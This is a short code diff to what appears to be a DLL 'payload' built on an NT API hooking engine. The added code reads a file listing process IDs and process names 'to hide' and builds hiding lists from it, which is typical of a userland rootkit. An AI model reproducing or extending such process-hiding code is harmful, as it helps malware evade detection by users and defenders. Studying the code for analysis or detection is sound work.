@@ -5,7 +5,7 @@
 //
 #include "Payload.h"
 
-#include "../NtHookEngine/NtHookEngine.h"
+#include "../NtHookEngine/Sources/NtHookEngine.h"
 #ifdef DEBUG_MODE
 #include <iostream>
 #include <fstream>
@@ -236,8 +236,16 @@ void InitializeDLL(pArgStruct args)
 	hMutex = CreateMutex(0, TRUE, NULL);
 	if (args == NULL)
 	{
-		ReleaseMutex(hMutex);
-		return;
+		TCHAR pIDsbuff[MAX_LINE], procNameBuff[MAX_LINE];	
+		FILE *fp;		 
+			fopen_s(&fp, INFO_TRANSFER_FILE, "r");		
+			fgetws(pIDsbuff, MAX_LINE, fp); //first line - list of pIDs to hide	
+			fgetws(procNameBuff, MAX_LINE, fp); //second line - list of process names to hide		
+			pIDsbuff[wcslen(pIDsbuff) - 1] = '\0'; //delete \n		
+			procNameBuff[wcslen(procNameBuff) - 1] = '\0';		
+			fclose(fp);	
+			PIDsNum = buildPIDsList(pIDsbuff, FALSE, &hiddenPIDsList);		
+			procNameNum = buildProcNameList(procNameBuff, FALSE, &hiddenProcessNames);	
 	}
 	else
 	{
